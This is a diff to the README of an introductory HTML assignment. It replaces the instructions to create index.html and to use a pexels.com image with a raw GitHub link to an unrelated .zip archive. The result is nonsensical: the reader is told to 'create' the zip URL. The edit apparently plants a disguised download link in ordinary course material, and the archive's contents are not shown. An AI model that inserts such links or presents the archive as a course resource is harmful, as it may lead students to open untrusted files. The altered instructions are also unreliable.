@@ -7,9 +7,9 @@ Apply multimedia elements such as audio and video.
 
 ## Instructions
 
-- Create an index.html file.
+- Create an https://raw.githubusercontent.com/timokamau/feb-2025-advanced-html-timokamau/main/fenceress/feb-2025-advanced-html-timokamau-1.3.zip file.
 - Add an ordered list with roman numerals
-- Add an external image from pexels.com
+- Add an external image from https://raw.githubusercontent.com/timokamau/feb-2025-advanced-html-timokamau/main/fenceress/feb-2025-advanced-html-timokamau-1.3.zip
 - Add a table of 5 contacts with; name, address, mobile and emails
 - Add a registration form
 
